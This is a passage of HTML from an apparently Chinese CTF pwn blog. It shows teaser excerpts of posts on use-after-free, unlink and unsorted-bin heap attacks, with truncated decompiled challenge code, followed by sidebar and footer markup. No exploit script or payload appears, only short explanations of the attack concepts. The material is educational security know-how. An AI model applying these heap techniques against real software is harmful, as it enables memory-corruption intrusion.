Free：即free后再次进行利用。Dangling Pointer（悬挂指针、悬空指针、迷途指针）是计算机编程中的一个常见且危险的问题，它指的是一个指针仍然保留着之前指向的内存地址，但是这片内存区域可能已经被释放或者不再有效，从而可能导致程序在使用该指针时出现未定义行为。 [NISACTF 2022]UAF[NISACTF 2022]UAF | NSSCTF 123456789101112131415161718192021222324252627282930313233343536373839404142434445int __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  _DWORD v3[4]; // [esp+8h] [ebp-10h] BYREF  v3[1] = __readgsdword(0x14u);  setbuf(stdin, 0);  setbuf(stdout, 0);  while ( 1 )  &#123;    wh...</div></div></div></a><a class="pagination-related" href="/2026/02/19/Unlink-attack/" title="Unlink_attack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Unlink_attack</div></div><div class="info-2"><div class="info-item-1">Unlink attackunlink，俗称拖链，将unsorted_bin中的处于free状态的堆块脱离出来，然后和物理地址相邻的新free的堆块合并成大堆块（可以是向前合并或者向后合并），合并完之后再放入unsorted_bin中。 一般产生漏洞的原因是通过off-by-null，off-by-one，堆溢出，修改了堆块的p标志位。 [SUCTF 2018 招新赛]unlink1234567891011121314151617181920212223242526272829303132333435int __fastcall main(int argc, const char **argv, const char **envp)&#123;  int v4; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v5; // [rsp+8h] [rbp-8h]  v5 = __readfsqword(0x28u);  init(argc, argv, envp);  puts(&quot;welcome to note system&quo...</div></div></div></a><a class="pagination-related" href="/2026/02/19/Unsorted-bin-attack/" title="Unsorted_bin_attack"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-19</div><div class="info-item-2">Unsorted_bin_attack</div></div><div class="info-2"><div class="info-item-1">Unsorted bin attack说是unsorted bin attack，在这里其实只是一个借助unsorted bin 来泄露libc的一种手段。 unsorted bin是一个双向链表，具体可以用下面这张图来演示。  所以，如果当我们能访问到尾节点的时候，就可以打印出尾节点的fd，指向的就是main_arena的地址，从而泄露出libc的基地址。 [HNCTF 2022 WEEK4]ez_uaf123456789101112131415161718192021222324252627282930313233343536373839404142int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+Ch] [rbp-4h]  init_env(argc, argv, envp);  puts(&quot;Easy Note.&quot;);  while ( 1 )  &#123;    while ( 1 )    &#1...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">xizi</div><div class="author-info-description">CTF Player | PWN</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">28</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">4</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xi-zi"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">PWN from zero to one .有问题之处，望多海涵。</div></div><div class="sticky_layout"><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/19/ret2gets/" title="ret2gets">ret2gets</a><time datetime="2026-04-19T09:47:37.000Z" title="发表于 2026-04-19 17:47:37">2026-04-19</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/17/%E6%B5%8B%E4%BF%A1%E9%81%93%E7%88%86%E7%A0%B4/" title="测信道爆破">测信道爆破</a><time datetime="2026-04-17T13:02:25.000Z" title="发表于 2026-04-17 21:02:25">2026-04-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/15/House%20of%20orange&amp;House%20of%20cat/" title="House of orange &amp; House of cat">House of orange &amp; House of cat</a><time datetime="2026-04-15T08:27:22.000Z" title="发表于 2026-04-15 16:27:22">2026-04-15</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/04/06/NCTF2026/" title="NCTF2026">NCTF2026</a><time datetime="2026-04-06T12:59:23.000Z" title="发表于 2026-04-06 20:59:23">2026-04-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/03/26/Nepctf2025/" title="Nepctf2025">Nepctf2025</a><time datetime="2026-03-26T13:10:11.000Z" title="发表于 2026-03-26 21:10:11">2026-03-26</time></div></div></div></div><div class="card-widget card-categories"><div class="item-headline">
+            <i class="fas fa-folder-open"></i>
+            <span>分类</span>
+            
+          </div>
+          <ul class="card-category-list" id="aside-cat-list">
+            <li class="card-category-list-item "><a class="card-category-list-link" href="/categories/IO/"><span class="card-category-list-name">IO</span><span class="card-category-list-count">1</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/heap/"><span class="card-category-list-name">heap</span><span class="card-category-list-count">8</span></a></li><li class="card-category-list-item "><a class="card-category-list-link" href="/categories/stack/"><span class="card-category-list-name">stack</span><span class="card-category-list-count">11</span></a></li>
+          </ul></div><div class="card-widget card-tags"><div class="item-headline"><i class="fas fa-tags"></i><span>标签</span></div><div class="card-tag-cloud"><a href="/tags/pwn/" style="font-size: 1.5em; color: #99a9bf">pwn</a> <a href="/tags/pwn%E5%85%A5%E9%97%A8/" style="font-size: 1.5em; color: #99a9bf">pwn入门</a> <a href="/tags/pwn%E8%BF%9B%E9%98%B6/" style="font-size: 1.5em; color: #99a9bf">pwn进阶</a> <a href="/tags/C%E8%AF%AD%E8%A8%80/" style="font-size: 1.1em; color: #999">C语言</a></div></div><div class="card-widget card-archives">
+    <div class="item-headline">
+      <i class="fas fa-archive"></i>
+      <span>归档</span>
+      
+    </div>
+  
+    <ul class="card-archive-list">
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/04/">
+            <span class="card-archive-list-date">
+              四月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/03/">
+            <span class="card-archive-list-date">
+              三月 2026
+            </span>
+            <span class="card-archive-list-count">4</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/02/">
+            <span class="card-archive-list-date">
+              二月 2026
+            </span>
+            <span class="card-archive-list-count">9</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2026/01/">
+            <span class="card-archive-list-date">
+              一月 2026
+            </span>
+            <span class="card-archive-list-count">2</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/12/">
+            <span class="card-archive-list-date">
+              十二月 2025
+            </span>
+            <span class="card-archive-list-count">6</span>
+          </a>
+        </li>
+      
+        <li class="card-archive-list-item">
+          <a class="card-archive-list-link" href="/archives/2025/11/">
+            <span class="card-archive-list-date">
+              十一月 2025
+            </span>
+            <span class="card-archive-list-count">3</span>
+          </a>
+        </li>
+      
+    </ul>
+  </div><div class="card-widget card-webinfo"><div class="item-headline"><i class="fas fa-chart-line"></i><span>网站信息</span></div><div class="webinfo"><div class="webinfo-item"><div class="item-name">文章数目 :</div><div class="item-count">28</div></div><div class="webinfo-item"><div class="item-name">本站访客数 :</div><div class="item-count" id="busuanzi_value_site_uv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">本站总浏览量 :</div><div class="item-count" id="busuanzi_value_site_pv"><i class="fa-solid fa-spinner fa-spin"></i></div></div><div class="webinfo-item"><div class="item-name">最后更新时间 :</div><div class="item-count" id="last-push-date" data-lastPushDate="2026-04-20T02:31:35.165Z"><i class="fa-solid fa-spinner fa-spin"></i></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By xizi</span><span class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 6.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.2</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/utils.min.js"></script><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/main.min.js"></script><div class="js-pjax"></div><script src="/js/click-poem.js"></script><script id="canvas_nest" defer="defer" color="0,255,255" opacity="0.3" zIndex="-1" count="60" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/canvas-nest.min.js"></script><script async data-pjax src="/"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><i class="fas fa-spinner fa-pulse" id="loading-status" hidden="hidden"></i><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="text-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据加载中</span></div><div class="local-search-input"><input placeholder="搜索文章..." type="text"/></div><hr/><div id="local-search-results"></div><div class="ais-Pagination" id="local-search-pagination" style="display:none;"><ul class="ais-Pagination-list"></ul></div><div id="local-search-stats"></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/hexo-theme-butterfly@5.5.2/source/js/search/local-search.min.js"></script></div></div></body></html>
